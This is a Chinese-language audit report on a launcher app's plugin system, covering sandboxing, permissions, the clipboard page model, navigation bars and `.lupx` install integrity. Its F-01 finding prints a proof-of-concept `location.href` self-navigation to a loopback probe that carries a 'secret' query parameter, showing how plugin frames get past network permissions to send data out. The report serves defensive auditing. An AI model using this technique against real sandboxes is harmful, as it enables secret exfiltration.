# 插件系统、导航页与剪贴板页专项审计

> 审计对象：`refactor/plugin-system`，基线 HEAD `7882d9e`。
>
> 审计日期：2026-10-25。
>
> 覆盖范围：插件发现与加载、逻辑宿主令牌、权限台账与 Rust 校验、Page Service / Presenter
> 沙箱、Page Model / Intent 路由、磁盘插件热重载、导航页栏目与搜索结果、剪贴板 Page
> Service、两个内置 Presenter、启动时序和现有 CDP 回归。
>
> 方法：先按仓库约定阅读 `ARCHITECTURE.md`、`UI_GUIDELINES.md`、`PLUGIN_API.md`、
> `PLUGINS.md`、`SETTINGS.md` 与 `TESTING.md`；随后对重构提交和当前实现做静态审计，
> 运行 TypeScript / Vite / Rust 测试与相关 CDP 脚本，并在本地 `test/` 目录构造隔离
> 插件、剪贴板数据和回环 HTTP 探针复现运行时问题。临时插件与数据均位于 gitignored
> 目录，不改动业务源码。

## 结论摘要

本轮共得到 14 项可行动问题：其中 1 项严重安全性问题、3 项高优先级功能/安全问题、
5 项中优先级状态、性能与供应链问题、2 项中低优先级交互/时序问题、3 项低优先级可维护性问题。
最需要优先处理的是插件帧的
自导航出口和剪贴板 Page Model 的字节上限失效。

| 编号 | 严重度 | 问题 | 证据 | 影响面 |
|---|---|---|---|---|
| F-01 | 严重 | Page Service / Presenter 可用 `location.href` 自导航，绕过 `network` 权限并向任意 HTTP(S) 地址发送数据 | 运行复现，本地 HTTP 探针收到请求 | 全部磁盘插件页与逻辑宿主 |
| F-02 | 高 | 剪贴板 Page Model 只按行数开窗，不按字节预算；图片缩略图或大文本可轻易越过 1 MiB 上限 | 运行复现，模型 1,713,735 bytes 被拒绝 | 剪贴板页，且隐藏页预热会影响整个启动 |
| F-03 | 高 | 逻辑宿主只在启动时读取一次插件清单，权限/trust/manifest 热更新后仍使用旧副本 | 运行复现，重载后仍拒绝，重启后放行 | 插件安装、重载、开发模式、权限变更 |
| F-04 | 高 | 磁盘 `navBars()` 经逻辑宿主返回 Promise，注册表却同步归一化，栏目被丢弃 | 运行复现，示例插件启用但无「快速链接」 | 导航页所有磁盘插件栏目 |
| F-05 | 中 | 导航结果 ID 直接拼接完整路径，超过 256 字符时 Intent Router 拒绝选择与激活 | 运行复现，329 字符 ID 点击无效 | 长 Windows 路径、长 URL、provider 结果 |
| F-06 | 中 | 分离窗口就绪状态推送缺少 `query`，标题栏 Presenter 与 `lume.on.query` 收不到当前查询 | 运行复现，模型 query=`an`，标题栏输入为空 | 可分离 mode、titlebar 搜索框 |
| F-07 | 中 | 切到剪贴板时 `onShow()` 与 `runSearch()` 各查一次数据库 | 运行计数，单次切换 `__searchClipboardCalls=2` | 剪贴板页、每次呼出和切换 |
| F-08 | 中低 | 剪贴板上下渐隐边跟随 overscan 后的窗口 offset，而不是真实滚动位置 | 运行复现，滚动 50px 无顶部渐隐，距底 20px 无底部渐隐 | 剪贴板两个 Presenter |
| F-09 | 中低 | 启动时先创建 WebView，再初始化 recent/pins/clipboard 状态，前端可能提前调用命令 | 运行日志出现 `state not managed` | 导航页首屏、启动恢复 |
| F-10 | 中 | 文本剪贴板与文件读取命令没有 Rust 侧 plugin_id/host_token 参数和权限校验 | 静态核对，与既有 `BUG_REPORT.md` 一致 | 插件权限三层防线 |
| F-11 | 低 | `pluginLogic.tsx` 卸载 iframe 时不移除匿名 message 监听器，也不清理未完成调用计时器 | 静态核对 | 开发热重载、长期运行内存 |
| F-12 | 低 | 逻辑帧 sandbox 仍含 `allow-forms allow-popups`，且 secrets RPC 对所有 entry 逻辑开放 | 静态核对 | 插件逻辑边界、文档契约 |
| F-13 | 低 | `cargo clippy --all-targets` 因恒真比较失败，另有 39 条 warning | 工具输出 | 交付质量门 |
| F-14 | 中 | `.lupx` 确认卡展示的 SHA-256 没有绑定到实际安装内容；校验、返回事实和磁盘提取分别重新打开源文件 | 静态核对，与既有 `BUG_REPORT.md` 一致 | `.lupx` 安装、升级、签名信任 |

## 复现环境

- Windows / WebView2，debug 可执行文件由
  `pnpm run tauri build --debug --no-bundle` 生成。
- 剪贴板压力样例：10 张互不相同的 200×200 随机噪声 PNG，每张 120,303 bytes；
  WebView2 端每个缩略图约 213,726 字符（base64）。
- 插件权限样例：`permission-hot` 初始清单无 `clipboard`，运行中把清单改为
  `permissions = ["clipboard"]` 后调用 `reload_plugin`，再与进程重启对比。
- 网络样例：本地 Node HTTP server 绑定 `127.0.0.1`，插件页面只执行一次
  `location.href = "http://127.0.0.1:<port>/...?secret=..."`，不声明 `network`。
- 所有复现脚本与生成数据保存在本地 `test/`，不纳入版本控制；测试结束后恢复原始
  `src-tauri/target/debug/data/`。

## 关键发现

### F-01：插件页面可通过自身导航绕过网络权限并外带数据

**严重度：严重。**

**契约。** `docs/PLUGINS.md` 与 `PLUGIN_API.md` 说明 Presenter 不能直接联网，宿主
HTTP 必须经过 Rust 的 `network` 权限、私网拒绝和重定向复查；逻辑帧也不能越过
`connect-src` / `form-action` 的边界。

**实现。** 两处 CSP 都写入了 `navigate-to 'none'`：

- [`src/page-runtime/presenterBridge.tsx:273-302`](../../src/page-runtime/presenterBridge.tsx#L273)
- [`pluginLogicFrame.html:8`](../../pluginLogicFrame.html#L8)

但 WebView2 实际没有执行该指令。沙箱只限制顶层导航，不限制帧自身导航；`location.href`
仍然会为当前 opaque-origin frame 发起新的 HTTP 请求。逻辑宿主还把 sandbox 写成
`allow-scripts allow-forms allow-popups allow-modals`（
[`src/pluginLogic.tsx:48`](../../src/pluginLogic.tsx#L48)），Presenter 侧虽然收窄为
`allow-scripts allow-modals`（[`src/plugins/iframeBridge.tsx:12`](../../src/plugins/iframeBridge.tsx#L12)），
同样不能阻止 iframe 自导航。

**运行复现。** 先启动本地 HTTP 探针，再加载一个不带 `permissions` 的 provider，
其工厂逻辑执行：

```js
window.location.href =
  "http://127.0.0.1:18777/nav-escape?secret=NAVIGATION_BYPASS";
```

探针收到：

```json
{
  "hits": [
    {
      "url": "/nav-escape?secret=NAVIGATION_BYPASS",
      "method": "GET"
    }
  ]
}
```

把相同逻辑放进 Presenter 的 HTML，只把 URL 改为
`/presenter-nav?secret=PRESENTER_NAVIGATION_BYPASS`，本地探针同样收到请求；Presenter
在导航前甚至会被记录为 `ready`。

现有 `scripts/cdp_presenter_network_verify.mjs` 对 fetch、no-cors、表单、图片、WebSocket、
EventSource 和 service fetch 的检查全部通过，但该脚本没有测试自导航，因此给了错误的
安全感。

**影响。**

- `network` 权限不再代表实际的网络访问能力。
- 带 `secrets` 权限的 Page Service 可以先读取 Credential Manager 中的密钥，再通过
  URL query 或路径把它交给外部站点。
- 即使只允许 loopback，也能探测本机服务、触发有副作用的 GET 路由，或把插件侧数据
  传给任意内网页面。
- 这类请求是标准的顶层文档导航，不受 `connect-src`、`form-action`、`img-src` 等
  资源指令约束。

**建议。**

1. 在 WebView2 层拦截子帧导航（`FrameNavigationStarting` 或等价机制），只允许
   `about:blank` / 宿主生成的 `srcdoc`，拒绝 `http:`、`https:` 和其他协议。
2. 不要继续依赖 `navigate-to`；当前 WebView2 构建没有提供该保护。
3. 把逻辑运行时迁到没有可导航 `location` 的 Worker / 受限 JS 引擎，或让宿主代理所有
   页面级资源与网络。
4. 去掉逻辑帧不必要的 `allow-forms` / `allow-popups`，同时保留对正常 bridge 的回归。
5. 在负向测试中增加 `location.href`、`location.assign`、`location.replace`、meta refresh、
   anchor click 和 `window.open`，并断言本地探针零请求。

### F-02：剪贴板 Page Model 没有字节预算，图片历史会让整页变成空列表

**严重度：高。**

**根因。** 剪贴板窗口只按行数计算：

- [`src/plugins/clipboard/store.ts:88-96`](../../src/plugins/clipboard/store.ts#L88)
  以 `clipRowH` 和固定 overscan 切片；
- [`src/page-services/clipboard/service.ts:74-76`](../../src/page-services/clipboard/service.ts#L74)
  直接把 `all.slice(start, end)` 放进模型；
- 每行的完整文本与 base64 缩略图都进入模型
  （[`src/page-services/clipboard/service.ts:22-35`](../../src/page-services/clipboard/service.ts#L22)）；
- [`src/page-runtime/modelStore.ts:13,96-110`](../../src/page-runtime/modelStore.ts#L13)
  对最终模型执行 1 MiB 硬上限。

**运行复现。** 向剪贴板写入 10 张互不相同的 200×200 噪声 PNG 后：

```text
search_clipboard total: 200
first 20 images: 13
first 20 thumb chars: 2,354,814
first 20 JSON chars: 2,358,623
actual visible Page Model: 1,713,735 bytes
```

Page Runtime 抛出：

```text
invalid page model: serialized size 1713735 exceeds 1048576 bytes
```

随后剪贴板 UI 显示：

```text
全部 / 文本 / ... / 收藏
暂无剪贴板历史
共 0 条
```

更严重的是，剪贴板页即使未激活，启动时也会被 `onMount` 预热
（[`src/App.tsx:1064`](../../src/App.tsx#L1064)），因此这个异常会在导航页启动阶段进入
未捕获链路；带同一份剪贴板数据的 `cdp_page_runtime_verify` 直接以该异常退出。

**影响。**

- 历史中只要有若干截图或大段文本，剪贴板页就可能完全不可用。
- `clip.row.content` 还可能与 `preview.payload.content` 重复，进一步放大模型体积。
- 由于异常发生在 Solid effect 中，用户看不到“模型超限”的错误，只看到空历史。
- 这不是极端输入：200×200 图片已经比常见截图小，实际 4K 截图缩略图就可能更大。

**建议。**

1. 让 Page Service 按序列化字节预算生成窗口，而不是按固定行数；输出前逐行累计，
   超预算时停止。
2. 不要把图片缩略图作为大 base64 字符串放进 Page Model；改为受控 asset/file URL，
   或在 Presenter 请求可见行时再按需取缩略图。
3. 文本行只传摘要；完整内容通过 `previewTarget` / action 按需读取。
4. 对单行超过预算的内容提供安全摘要和显式“查看完整内容”动作，不让单行拖垮整页。
5. 在 `session.publish` 外层把模型超限转成可见的页面错误，并停止隐藏页预热或将其延后。
6. 增加一个“10 张高熵图片 + 20 条长文本”的回归，断言页面至少能显示窗口内行。

### F-03：逻辑宿主权限源不热刷新，安装/重载新权限必须重启进程

**严重度：高。**

**实现。** 逻辑宿主启动时执行一次 `get_plugins` 并写入自己的权限源：

- [`src/pluginLogic.tsx:391-397`](../../src/pluginLogic.tsx#L391)
- [`src/plugins/permissions.ts:64-105`](../../src/plugins/permissions.ts#L64)

它的 `settings-applied` 监听器只刷新颜色模式、skin、accent 等设置，没有重新读取插件
清单（[`src/pluginLogic.tsx:399-410`](../../src/pluginLogic.tsx#L399)）。主窗口
`refreshPlugins()` 会读取新清单并更新 Rust 侧权限缓存，但这份更新不会进入逻辑宿主。

**运行复现。**

1. `permission-hot` 以无 `clipboard` 权限启动；
2. 搜索一次，得到 `DENIED`；
3. 把插件清单改为 `permissions = ["clipboard"]`；
4. 调用 `reload_plugin`，主窗口的 `get_plugins` 已返回：
   `permissions: ["clipboard"]`；
5. 再次搜索仍得到 `DENIED`；
6. 杀掉进程重启后，同一插件得到 `ALLOWED:null`。

**影响。**

- 运行时安装带受保护能力的插件后，该插件的能力调用会一直失败到应用重启。
- 开发者编辑 `permissions` 后按「重载」不会看到新权限。
- 切换开发者模式、`trusted`、`trust_all` 同样可能只更新主窗口/Rust，逻辑宿主仍按旧
  manifest 判断。
- 与“安装即用、无需重启”和“每次设置保存自动重载”的文档承诺冲突。

**建议。**

- `pluginLogic` 在 `settings-applied` 和 `plugin-reload` 上重新调用 `get_plugins`，
  在完成 `setPermissionSource` 前不要让新帧执行受保护 RPC；或者把 manifest 版本 / hash
  随 `plugin_logic_push` 下发，宿主发现版本变化时刷新。
- 增加回归：启动后再放一个声明 `clipboard` 或 `network` 的插件，触发设置事件与重载，
  不重启进程，断言受保护 RPC 成功。
- 对 `trust_all`、`trusted`、`disabled` 变化各做一次负向/正向断言。

### F-04：磁盘 `navBars()` 的 Promise 被同步归一化，所有插件栏目消失

**严重度：高。**

**根因。** 逻辑代理的每个属性访问都返回 `(...args) => logicCall(...)`，因此
`logic.navBars()` **总是**返回 Promise，即使插件源码中的 `navBars` 是同步函数：

- [`src/plugins/registry.ts:555-568`](../../src/plugins/registry.ts#L555)
- [`src/plugins/registry.ts:643-659`](../../src/plugins/registry.ts#L643)

`navBarsContribution` 却直接调用 `normalizeNavBarContributions(..., (logic.navBars)())`；
归一化函数只接受数组，收到 Promise 后返回空数组。外层 `refreshBars()` 虽然 `await`
了这个外层 Promise，但内部的逻辑 Promise 从未被等待
（[`src/page-services/navigate/service.ts:109-118`](../../src/page-services/navigate/service.ts#L109)）。

另有一个时序问题：逻辑帧尚未 ready 时 `logicCall` 会立即拒绝
（[`src/plugins/registry.ts:292-295`](../../src/plugins/registry.ts#L292)）；`logic-loaded`
动作只补投设置，没有触发导航页重新拉取栏目
（[`src/plugins/registry.ts:416-434`](../../src/plugins/registry.ts#L416)）。因此首屏通常先
打印每个插件的 `logic not loaded`，即使后续逻辑 ready，也要等到下一次呼出或设置刷新才
有机会重新请求。

**运行复现。** 把仓库自带 `examples/plugins/nav-bar/` 复制到 debug 插件目录，插件清单
显示 `enabled=true`、`apiError=null`、`entry=main.js`；进入导航页后：

```json
{
  "titles": ["最近使用", "推荐使用"],
  "barIds": ["recent", "recommended"],
  "hasQuickLinks": false
}
```

`examples/plugins/nav-bar/main.js` 的注释明确写着“异步也可以 — 宿主会等待并做形状
校验”，但当前实现没有等待。

**影响。**

- 任意 provider / service / mode 的磁盘栏目都不可见。
- 插件作者最容易复制的示例本身失效，文档和运行时行为相反。
- 启动阶段为每个插件产生无意义的 `logic not loaded` 异常，干扰真实错误诊断。

**建议。**

- 把归一化改成 `await raw` 后再校验：`const raw = await logic.navBars(); normalize(raw)`。
- 在 `logic-loaded` 时调用 `navigatePlugin.refreshBars()`；或让加载完成事件携带 hook 列表。
- 对未实现 `navBars` 的插件避免代理假阳性：在 load 完成时返回 hooks 列表，再决定是否
  注册栏目贡献。
- 增加同步、异步、抛错、非数组、坏条目和重复 bar id 的回归。

### F-05：长导航结果 ID 被 Intent Router 拒绝，行可见但不可点击

**严重度：中。**

**实现。** 导航服务把完整路径直接嵌入结果 ID：

- [`src/page-services/navigate/service.ts:58-64`](../../src/page-services/navigate/service.ts#L58)

Intent Router 又只接受不超过 256 个字符的 ID：

- [`src/page-runtime/intents.ts:22-23`](../../src/page-runtime/intents.ts#L22)
- [`src/page-runtime/intents.ts:79-85`](../../src/page-runtime/intents.ts#L79)

两处没有共享同一个长度约束。

**运行复现。** provider 返回一条 `enter: true` 的结果，`path` 为
`https://example.com/` 加 300 个 `x`。导航页实际生成：

```json
{
  "id": "result:https://example.com/xxxx…:3",
  "idLen": 329,
  "row": true
}
```

点击该行后，诊断记录：

```json
[
  {
    "type": "selection.set",
    "status": "failed",
    "code": "intent.target"
  },
  {
    "type": "item.activate",
    "status": "failed",
    "code": "intent.target"
  }
]
```

provider 的 `onEnter` 存储键保持 `null`，说明动作没有到达 Page Service。

**影响。**

- Windows 长路径、带长 query 的 URL、长文件名 provider 结果都能稳定触发。
- 行看起来正常、鼠标悬停也能高亮，但点击和 Enter 无反馈。
- 结果数量或内容变化时若使用哈希化 ID，还需避免碰撞与选择漂移。

**建议。**

- 为每个结果生成短、稳定、无碰撞的 ID（例如按 `path + section/index` 做 SHA-256 截断，
  再加序号处理碰撞），完整路径继续放在模型字段里。
- 或者把 Intent 的 ID 上限提高到足以覆盖 Windows 长路径，并在模型生成处统一校验、
  生成可见错误；不要依赖两个不同模块对长度作出不同假设。
- 增加 provider 长 URL、长 UNC 路径、重复 path 和超长条目名的回归。

### F-06：分离窗口就绪推送缺少 query，标题栏输入与 Page Model 分叉

**严重度：中。**

**实现。** 分离窗口的 `plugin-state` 处理明确会消费 `s.query`：

- [`src/pluginWindow.tsx:448-457`](../../src/pluginWindow.tsx#L448)

但 Page Runtime 的 detached supplier 在 ready/show 推送中没有写 `query` 字段：

- [`src/plugins/registry.ts:1114-1140`](../../src/plugins/registry.ts#L1114)

文档要求 ready 推送包含 `{show, query, enter, settings, snapshot?}`，见
[`docs/PLUGIN_API.md`](../PLUGIN_API.md) §6.8.1。

**运行复现。** 使用 `examples/plugins/titlebar-demo/`：

1. 在启动器内输入查询 `an`，模型 `data.query` 为 `"an"`；
2. 点击分离按钮；
3. 分离窗口的模型仍为 `data.query = "an"`；
4. 标题栏 Presenter 的 `#q` 输入框为空；
5. `__pluginStates` 的 ready 推送中只有 `show/model/...`，没有 `query`。

这不是标题栏自身的实现错误：`titlebar.html` 已正确注册
`lume.on.query = (q) => { ... }`，只是宿主没有重放该事件。

**影响。**

- 页面自带搜索框的分离模式显示空查询，但视图已按旧 query 过滤，用户无法判断当前过滤条件。
- 依赖 `lume.on.query` 而不是模型字段的 Presenter 会在首次分离时丢失状态。
- 关闭窗口回传 `lastQuery` 时可能保持旧值，回流后的搜索框与页面过滤状态不一致。

**建议。**

- 在 Page Runtime detached `push` 中加入 `query: runtime.instance.query()`；只有在
  launcher 当前查询确实变化时才回灌，避免 ready 重放引发循环。
- 对 view 和 titlebar 都按 `query → show → enter` 的顺序重放。
- 增加 titlebar-demo 的“输入查询后分离，标题栏值一致”和“关闭回流后值一致”回归。

### F-07：切到剪贴板时会重复执行两次数据库搜索

**严重度：中。**

**实现。** `switchMode()` 先调用目标页的 `onShow()`，随后又调用 `runSearch()`：

- [`src/App.tsx:915-942`](../../src/App.tsx#L915)

剪贴板的 Page Service 把 `onShow()` 实现为再次搜索：

- [`src/page-services/clipboard/service.ts:238-245`](../../src/page-services/clipboard/service.ts#L238)

呼出路径也有同样结构：先 `runSearch()`，随后遍历所有 mode 的 `onShow()`
（[`src/App.tsx:1193-1196`](../../src/App.tsx#L1193)）。

**运行复现。** 打开应用并等待初始化，切到剪贴板前把诊断计数清零，单次模式切换后读取：

```json
{
  "calls": 2,
  "active": "剪贴板",
  "route": [
    { "ev": "switch", "to": "clipboard" },
    { "ev": "search", "q": "" }
  ]
}
```

**影响。**

- 每次呼出、每次切换都会多一次 SQLite 查询。
- 图片历史会重复执行文件读取、PNG 解码、缩放和 base64 编码，是 F-02 的直接放大器。
- 两个并发查询共享同一个 token 时，后发的搜索让先发结果变为 stale，但 CPU 工作仍照常完成。

**建议。**

- 让 root `runSearch` 成为查询的唯一入口；剪贴板的 `onShow` 只做页面生命周期工作。
- 在 Page Service 或 store 内合并同 query/kind 的在途搜索，返回同一个 Promise。
- 增加 `__searchClipboardCalls` 回归，断言单次切换和单次呼出都只计数 1。

### F-08：剪贴板上下渐隐边被 overscan 错误推迟/提前关闭

**严重度：中低。**

**实现。** `clipStart` 从真实滚动行减去 `CLIP_OVERSCAN`：

- [`src/plugins/clipboard/store.ts:88-96`](../../src/plugins/clipboard/store.ts#L88)

两个 Presenter 直接用模型窗口 offset 判断渐隐：

- [`src/presenters/clipboard-list/ClipboardListPresenter.tsx:163,293`](../../src/presenters/clipboard-list/ClipboardListPresenter.tsx#L163)
- [`src/presenters/clipboard-compact/ClipboardCompactPresenter.tsx:193,276`](../../src/presenters/clipboard-compact/ClipboardCompactPresenter.tsx#L193)

因此顶部渐隐要等到滚动超过约 8 行（`CLIP_OVERSCAN * rowHeight`）才出现；底部渐隐会在
距离底部约 8 行时提前消失。

**运行复现。** 切到剪贴板文本分类（157 行）：

```json
{
  "nearTop": {
    "top": 50,
    "offset": 0,
    "fades": ["scroll-fade bottom"]
  },
  "nearBottom": {
    "top": 7768,
    "offset": 145,
    "limit": 12,
    "total": 157,
    "fades": ["scroll-fade top"]
  }
}
```

按照 UI 契约，前者应同时有顶部渐隐，后者应同时有底部渐隐。

**建议。**

- 由 Presenter 根据真实 `scrollTop` 和 `clientHeight/scrollHeight` 判断边缘，不要把
  overscan 窗口当成可见区域。
- 把 `scrollTop`/可视首末行写进模型，或让 Presenter 的本地滚动状态直接驱动 fade。
- 断言滚动 1px、overscan 边界、距底 1px 和空列表四种状态。

### F-09：启动时 WebView 先于 recent/pins/clipboard 状态初始化

**严重度：中低，非确定性时序问题。**

**实现顺序。** `lib.rs` 先创建 main/settings/preview 三个 webview
（[`src-tauri/src/lib.rs:135-223`](../../src-tauri/src/lib.rs#L135)），到 setup 后半段才创建
recent/pins/clipboard 管理状态
（[`src-tauri/src/lib.rs:382-386`](../../src-tauri/src/lib.rs#L382)）。前端 meanwhile 在组件
setup 和 `onMount` 阶段就调用 `refreshPlugins()`、`runSearch()`、各页 `onShow()`：

- [`src/App.tsx:689`](../../src/App.tsx#L689)
- [`src/App.tsx:1025-1064`](../../src/App.tsx#L1025)

**运行证据。** 快速启动并立即呼出时，CDP console 记录：

```text
get_recent_apps failed state not managed for field `state` ...
get_pinned_apps failed state not managed for field `state` ...
```

后续再次呼出通常会恢复，所以这是首屏/启动恢复的时序缺陷，而不是永久性数据损坏。

**影响。**

- 快速呼出或启动时自动恢复上次页面时，最近使用/固定栏目可能暂时缺失。
- 同一个启动过程可能产生与产品行为无关的错误日志，掩盖真正的插件错误。
- 在机器负载高或插件较多时窗口加载更晚，暴露概率上升。

**建议。**

- 在创建任何 webview 之前完成 recent/pins/clipboard 的数据库初始化。
- 如果必须延后，增加 `backend-ready` 命令/事件，前端 boot 搜索和 `onShow()` 等待它。
- `get_recent_apps` / `get_pinned_apps` 在前端遇到临时 state 未管理错误时应有限重试，
  而不是只记录 console。

### F-10：文本剪贴板与文件读取插件命令缺少 Rust 侧能力门

**严重度：中，安全性防御纵深缺口。**

**现状。** 前端台账要求：

- `clipboard.readText` / `clipboard.writeText`
- `fs.readText` / `fs.bytes` / `fs.thumb` / `fs.videoPoster` / `fs.icon`

但这些方法仍调用不带 `plugin_id` / `host_token` 的通用命令：

- [`src/plugins/hostApi.ts:195-197,357-388`](../../src/plugins/hostApi.ts#L195)
- [`src-tauri/src/clipboard.rs:1276-1290,1860-1928`](../../src-tauri/src/clipboard.rs#L1276)

对应 Rust 函数签名没有 `State<PluginPermState>`、`plugin_id` 或 `host_token` 参数，也没有
`assert_native_or_capability`。当前逻辑 iframe 的 raw invoke 在实测中会挂起，因此本轮没有
找到一条从 iframe 直接利用这些命令的完整链；但这仍违背仓库硬性约定“Rust 命令侧按
plugin_id 白名单二次校验”，并会把安全性寄托在 WebView2 当前的 origin/IPC 行为上。

**影响。**

- 如果 Tauri 初始化脚本、WebView2 版本或 sandbox 策略变化，raw invoke 会直接成为能力绕过。
- 与 `docs/BUG_REPORT.md` 中既有的加固建议重复，说明该边界尚未收口。
- 插件权限变更、窗口标签或 future bridge 变化时，没有第二层 fail-closed。

**建议。**

- `get_clipboard_text`/`set_clipboard_text` 增加插件调用入口参数，用
  `assert_native_or_capability(..., "clipboard")`；native main 路径保持显式 `plugin_id=None`。
- `get_file_text`/`get_file_bytes`/`get_file_thumb`/`get_video_thumb`/`get_app_icons` 增加
  插件归属并在 Rust 侧检查 `fs.read`；图标/缩略图可拆成只读宿主能力。
- 对每个 host RPC 建立一条静态台账测试，断言“前端权限词、RPC switch、Rust command、
  Rust state 参数”四者一一对应。

### F-11：逻辑帧卸载不清理 message listener 与 pending call timers

**严重度：低。**

**实现。** 每个插件加载时注册匿名监听器：

- [`src/pluginLogic.tsx:201`](../../src/pluginLogic.tsx#L201)

卸载只移除 iframe 并删除 entries 映射：

- [`src/pluginLogic.tsx:341-347`](../../src/pluginLogic.tsx#L341)

没有 `removeEventListener`，也没有遍历 `entry.calls` 清理计时器；计时器回调还会继续引用
旧 token/entry（[`src/pluginLogic.tsx:225-228,369-381`](../../src/pluginLogic.tsx#L225)）。

**影响。**

- 开发模式每次重载都会累积闭包与 DOM/frame 引用。
- 卸载后仍可能收到超时回执，污染新插件的诊断或触发旧 token 的错误日志。
- 应用长时间运行并频繁重载插件时内存与日志会增长。

**建议。**

- 把绑定的 `message` handler 存进 `LogicEntry`，卸载时移除。
- 卸载时清理 `entry.calls` 的 timer 与 pending Promise，并向 registry 回执取消。
- 增加 `unload → load → unload` 三轮的 listener 数量与 timer 数量断言。

### F-12：逻辑帧权限面仍比文档更宽

**严重度：低。**

两处契约偏差目前都要求插件在清单里显式声明或由用户显式开启相关权限，因此不是未授权
提权，但会让实现与 `PLUGIN_API.md` 的“Presenter / Page Service 角色”描述不一致：

1. 逻辑帧 `SANDBOX` 仍允许 forms/popups
   （[`src/pluginLogic.tsx:48`](../../src/pluginLogic.tsx#L48)）。CSP 能挡住 form action，
   当前测试中的 `window.open` 也被浏览器弹窗策略拦截，但 sandbox 属性本身没有收紧。
2. `public/pluginLogicFrame.js` 对所有 entry 逻辑暴露 `lume.secrets`，而文档写“Page Service
   独有”；同时 `pluginLogic.tsx` 把所有逻辑帧 token 的 role 注册为 `service`
   （[`src/pluginLogic.tsx:195`](../../src/pluginLogic.tsx#L195)）。provider/service 只要清单声明
   `secrets`，就能读取同名 Credential Manager 槽位。

**建议。**

- 统一“service role”定义：如果是 Page Service 专属能力，provider/service token 不能通过
  `plugin_secret_service_get`。
- 在逻辑帧只注入 `page`/`secrets` 于 API 2 Page Service，而不是所有 kind。
- 收紧 sandbox，或把 forms/popups 的存在写进公开安全边界并补负向测试。

### F-13：Rust 质量门当前无法通过 clippy

**严重度：低，工程可维护性。**

`cargo check` 和 `cargo test` 均通过；但：

```text
cargo clippy --all-targets --message-format=short
```

退出码 1。错误位置是
[`src-tauri/src/plugin_devwatch.rs:118`](../../src-tauri/src/plugin_devwatch.rs#L118)：

```rust
if result.0 >= WAIT_OBJECT_0.0 && result.0 < WAIT_OBJECT_0.0 + 1 {
```

`result.0` 是无符号类型，`>= 0` 恒真，clippy 将其作为
`absurd_extreme_comparisons` 拒绝。另输出 39 条 warning，其中包括未使用 import、重复
`sort_by_key`、过时 `chunks_exact` 写法等。

**建议。**

- 明确意图后写成 `result == WAIT_OBJECT_0`，并单独处理 `WAIT_FAILED`、超时和 abandoned。
- 清理 warning 或给 legacy warning 加窄范围 allow，避免真正的 clippy 错误被噪声掩盖。
- 至少在 debug 构建前把 clippy 结果纳入本地质量门。

### F-14：`.lupx` 确认卡没有把展示的 SHA-256 绑定到实际提取内容

**严重度：中。**

**实现。** `plugin_lupx_inspect` 展示 `arch.archive_sha256`，但安装命令只接收
`source_path`，不接收确认卡上的 hash：

- [`src-tauri/src/plugin_install.rs:695-735`](../../src-tauri/src/plugin_install.rs#L695)
- [`src-tauri/src/plugin_install.rs:787-833`](../../src-tauri/src/plugin_install.rs#L787)

`install_into` 先调用 `read_lupx_verified(source_path, ...)`，完成 manifest、大小和
签名校验；随后 `extract_to(source_path, ...)` 又**重新打开**同一路径
（[`src-tauri/src/plugin_install.rs:465-519`](../../src-tauri/src/plugin_install.rs#L465)）。
安装完成后返回的 `LupxInfo` 还第三次通过 `read_lupx(&source_path)` 读取源文件
（[`src-tauri/src/plugin_install.rs:787-829`](../../src-tauri/src/plugin_install.rs#L787)）。

**影响。**

- 用户确认的包与实际提取的包之间没有字节绑定；本地进程、网络共享或在选中文件后
  被其他程序替换时，存在 TOCTOU 窗口。
- 签名只能证明第一次读取到的内容，不能证明随后重新打开的路径仍是同一内容。
- 安装完成响应中的 name/version/permissions 也可能来自与已安装目录不同的包。

**建议。**

- 确认卡把 inspect 得到的 SHA-256 随安装请求一并提交，安装前重新计算并拒绝不一致。
- 更稳妥的做法是一次打开文件并复用同一只读 handle，或先把包复制到私有 staging
  临时文件，之后再校验、签名、提取和返回事实。
- 安装结束后从 staging/已安装目录重新计算 hash，作为响应事实，而不是再次读取源路径。
- 增加“确认后替换源文件”“安装在网络路径上”和“安装中途截断”三类回归。

## 验证记录

| 命令 / 脚本 | 退出码 | 结果与说明 |
|---|---:|---|
| `pnpm exec tsc --noEmit` | 0 | 无 TypeScript 错误 |
| `pnpm run build` | 0 | Vite 生产构建通过，125 个模块 |
| `pnpm run tauri build --debug --no-bundle` | 0 | debug 可执行文件构建通过 |
| `cargo test` | 0 | 252 passed、9 ignored、0 failed |
| `pnpm run test:page-runtime` | 0 | 13/13 |
| `pnpm run test:skin-system` | 0 | 11/11 |
| `node scripts/check_i18n.mjs` | 0 | 580 keys × 3 languages，65 组关键词 |
| `node scripts/cdp_presenter_network_verify.mjs` | 0 | 5/5；未覆盖自导航出口 |
| `node scripts/cdp_clipboard_p2.mjs` | 0 | 暂停/恢复与合并复制回归通过 |
| `node scripts/cdp_clipboard_smoke.mjs` | 0 | 分类、行渲染、多选、清空等通过 |
| `node scripts/cdp_page_runtime_verify.mjs` | 1 | 大图历史触发 1,713,740-byte Page Model 异常并退出；空数据库时另有多项 fixture 依赖失败 |
| `cargo clippy --all-targets --message-format=short` | 1 | `plugin_devwatch.rs:118` 恒真比较错误，另 39 条 warning |

### 自定义复现

以下脚本位于本地 `test/`（gitignored），用于把现象固定为可重跑的最小样例：

- `repro_nav_escape.mjs`：逻辑帧 `location.href` 自导航。
- `repro_presenter_nav_escape.mjs`：Presenter `location.href` 自导航。
- `repro_clip_model.mjs`：10 张噪声图片导致 Page Model 超限。
- `repro_permission_hot.mjs`：权限清单热重载与重启对比。
- `repro_navbar.mjs`、`repro_nav_startup.mjs`：磁盘栏目不渲染和启动时序。
- `repro_long_result_id.mjs`：329 字符结果 ID 无法选择/激活。
- `repro_detached_query.mjs`：分离窗口模型 query 与标题栏输入分叉。
- `repro_clip_double_search.mjs`：单次切换两次剪贴板搜索。
- `repro_clip_fades.mjs`：overscan 与渐隐边条件不一致。
- `repro_startup_race.mjs`：启动早期状态未管理错误与恢复。

## 测试盲区

当前回归覆盖了大量正常路径，但以下几个盲区让本轮问题没有被提前发现：

1. **网络负向测试只覆盖资源请求。** `cdp_presenter_network_verify` 覆盖了 fetch、
   XHR/WebSocket/EventSource、form、image 和 service fetch，没有覆盖文档自身导航。
   `navigate-to` 在实测 WebView2 中不生效，因此必须在宿主层或导航事件层补一条断言。
2. **没有 Page Model 字节压力测试。** Page Runtime 单测验证了“超限会失败”，但没有验证
   “剪贴板等真实页面在正常历史规模下不会超限”。应把大图、长文本和历史上限组合进 CDP。
3. **没有磁盘 `navBars()` 的异步测试。** 仓库示例恰好是 async，但没有对应 CDP 用例。
